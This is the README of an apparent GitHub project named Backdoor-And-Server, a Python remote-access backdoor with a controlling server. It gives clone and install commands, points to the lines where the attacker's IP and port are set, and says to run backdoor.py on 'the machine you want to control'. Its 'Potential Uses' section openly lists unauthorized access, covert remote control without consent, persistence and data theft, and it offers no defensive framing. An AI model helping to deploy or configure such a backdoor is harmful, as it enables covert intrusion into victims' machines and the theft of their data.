## Installation Process 📥

- Let's get you started with Backdoor-And-Server. First, clone the repository and navigate to the `Backdoor-And-Server` directory:

```bash
$ git clone https://github.com/Advaidv121/Backdoor-And-Server && cd Backdoor-And-Server
```

## Requirements 🛠️

Next, install the requirements using pip3 with the following instructions:

For **Server.py**
```
$ pip3 install tqdm
```
For **Backdoor.py**
```
$ pip3 install pyautogui 
```

## Pre Execution ⏮️

- On line number **137** of **server.py** file
```
137. sock.bind(('xx.xxx.xx.xx',xxxx)) #replace 'xx.xxx.xx.xx' with server ip and xxxx with port number
```
- On line number **153** of **backdoor.py** file
```
153. s.connect(('xx.xxx.xx.xx',xxxx))  #replace 'xx.xxx.xx.xx' with server ip and xxxx with port number
```

## Execution 🏃‍♂️

- Run the backdoor.py script on the machine you want to control:
```
python backdoor.py
```
- Run the server.py script on the machine from which you want to control the server:
```
python server.py
```
- This will establish a connection with the server, and you can start sending commands to be executed on the server.🛜

## Available Commands 💡

- Here's a table of the commands you can run on the server from the client:

| Command                | Description                                                     |

## Potential Uses 🌟

- Backdoor and server can be used for:

-Unauthorized Access: Malicious actors use backdoors to gain unauthorized access to a computer system, network, or device. This unauthorized access can lead to data theft, surveillance, or further exploitation.

-Remote Control: Backdoors provide remote control over a compromised system. Attackers can manipulate the victim's computer, executing commands and actions without the user's knowledge or consent.

-Persistence: Backdoors are often used to maintain a persistent presence within a compromised network or system. This allows attackers to maintain access even if initial security flaws are patched.

-Data Theft: Backdoors enable the exfiltration of sensitive data, such as personal information, financial records, or intellectual property, which can then be misused or sold.
